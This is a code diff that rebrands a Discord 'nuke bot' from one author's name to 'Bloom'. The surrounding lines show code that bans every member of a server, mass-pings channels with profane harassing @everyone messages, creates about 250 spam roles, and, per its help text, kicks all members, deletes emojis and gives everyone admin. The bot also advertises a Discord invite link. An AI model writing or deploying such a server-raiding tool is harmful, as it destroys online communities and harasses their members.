@@ -15,14 +15,14 @@ client.remove_command('help')
 
 token = input('Enter your token here: ')
 
-channel_names = ['Fucked by J4n0sch', 'Csgo on top', 'Fucked By J4n0sch', 'J4n0sch op', 'https://i.pinimg.com/originals/60/5c/d4/605cd48fb2eec1967e0662936a610db0.gif']
-message_spam = ['@everyone GET FUCKED BY J4N0SCH', '@everyone J4N0SCH  OWNS YOU', '@everyone J4N0SCH piss on you', '@everyone']
-webhook_names = ['Csgo on top', 'J4n0sch On Top']
+channel_names = ['Fucked by Blomm', 'Csgo on top', 'Fucked By Bloom', 'Bloom op', 'https://i.pinimg.com/originals/60/5c/d4/605cd48fb2eec1967e0662936a610db0.gif']
+message_spam = ['@everyone GET FUCKED BY BLOOM', '@everyone Bloom  OWNS YOU', '@everyone Bloom piss on you', '@everyone']
+webhook_names = ['Csgo on top', 'Bloom On Top']
 
 ###################################################################################
 @client.event
 async def on_ready():
-  await client.change_presence(activity=discord.Game(name= "made by J4n0sch || .gg/bugZDPxYbF"))#change this if you want
+  await client.change_presence(activity=discord.Game(name= "made by Bloom || .gg/bugZDPxYbF"))#change this if you want
   print(f'''
 ░▒█▀▀▄░█░░▄▀▀▄░▄▀▀▄░█▀▄▀█
 ░▒█▀▀▄░█░░█░░█░█░░█░█░▀░█
@@ -72,7 +72,7 @@ async def nuke(ctx, amount=50):
           print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
     for member in list (ctx.guild.members):
         try:
-          await member.ban(reason="J4n0sch owns yall")#change this if u want
+          await member.ban(reason="Bloom owns yall")#change this if u want
           print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
         except:
           print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
@@ -123,7 +123,7 @@ async def rolespam(ctx):
   await ctx.message.delete()
   for i in range(1, 250):
     try:
-      await ctx.guild.create_role(name=f"TRASHED BY J4N0SCH")
+      await ctx.guild.create_role(name=f"TRASHED BY Bloom")
       print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
     except:
       print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")
@@ -167,9 +167,9 @@ async def admin(ctx):
 async def help(ctx, *args):
     await ctx.message.delete()
     retStr = str("""```fix\nnuke - Destroys Guild\n\nbanall - Bans All Members \n\nkickall - Kicks All Members\n\nrolespam - Spams Roles\n\nemojidel - Deletes All Emojis\n\nnone\n\nadmin - Gives Everyone Admin```""")
-    embed = discord.Embed(color=14177041,title="J4n0sch Nuke Bot 24/7")
-    embed.add_field(name="J4n0sch Nuke Bot Help Commands",value=retStr)
-    embed.set_footer(text=f"Requested By {ctx.author} |  Nuke Bot 24/7 | Made By J4n0sch")
+    embed = discord.Embed(color=14177041,title="Bloom Nuke Bot 24/7")
+    embed.add_field(name="Bloom Nuke Bot Help Commands",value=retStr)
+    embed.set_footer(text=f"Requested By {ctx.author} |  Nuke Bot 24/7 | Made By Bloom")
 
     await ctx.send(embed=embed)
 
